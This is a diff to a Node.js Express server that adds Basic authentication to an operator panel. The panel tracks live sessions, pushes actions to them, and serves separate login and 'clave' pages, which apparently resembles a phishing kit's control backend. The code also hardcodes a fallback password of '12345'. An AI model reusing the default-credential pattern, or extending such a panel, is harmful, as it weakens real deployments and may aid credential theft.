@@ -6,12 +6,50 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
+const PANEL_USER = process.env.PANEL_USER || 'admin';
+const PANEL_PASSWORD = process.env.PANEL_PASSWORD || '12345'; // Cambiar en Render
+
+const authMiddleware = (req, res, next) => {
+  const authHeader = req.headers.authorization;
+  if (!authHeader) {
+    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
+    return res.status(401).send('Authentication required');
+  }
+
+  const authParts = authHeader.split(' ');
+  if (authParts.length !== 2 || authParts[0].toLowerCase() !== 'basic') {
+    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
+    return res.status(401).send('Authentication required');
+  }
+
+  const credentials = Buffer.from(authParts[1], 'base64').toString().split(':');
+  const user = credentials[0];
+  const pass = credentials[1];
+
+  if (user === PANEL_USER && pass === PANEL_PASSWORD) {
+    return next();
+  }
+
+  res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
+  return res.status(401).send('Invalid credentials');
+};
+
 app.get('/', (req, res) => {
   res.redirect('/login.html');
 });
 
-// Serve static files from the root directory
-app.use(express.static(path.join(__dirname)));
+// Expose public static folders
+app.use('/css', express.static(path.join(__dirname, 'css')));
+app.use('/js', express.static(path.join(__dirname, 'js')));
+app.use('/assets', express.static(path.join(__dirname, 'assets')));
+
+// Expose public HTML files individually
+app.get('/login.html', (req, res) => res.sendFile(path.join(__dirname, 'login.html')));
+app.get('/clave.html', (req, res) => res.sendFile(path.join(__dirname, 'clave.html')));
+app.get('/index.html', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+
+// Protect and serve the /panel directory statically
+app.use('/panel', authMiddleware, express.static(path.join(__dirname, 'panel')));
 
 // In-memory sessions store
 let sessions = {};
@@ -53,7 +91,7 @@ app.post('/api/sessions', (req, res) => {
 });
 
 // 2. Get all sessions (calculated online state)
-app.get('/api/sessions', (req, res) => {
+app.get('/api/sessions', authMiddleware, (req, res) => {
   const now = Date.now();
   const list = Object.values(sessions).map(s => {
     const online = now - s.last_seen < 20000;
@@ -102,7 +140,7 @@ app.post('/api/sessions/:id/ping', (req, res) => {
 });
 
 // 6. Set action for a session (from operator panel)
-app.post('/api/sessions/:id/action', (req, res) => {
+app.post('/api/sessions/:id/action', authMiddleware, (req, res) => {
   const { id } = req.params;
   const { action, state } = req.body;
   if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
@@ -133,7 +171,7 @@ app.post('/api/sessions/:id/state', (req, res) => {
 });
 
 // 8. Clear all sessions
-app.post('/api/clear', (req, res) => {
+app.post('/api/clear', authMiddleware, (req, res) => {
   sessions = {};
   res.json({ success: true });
 });
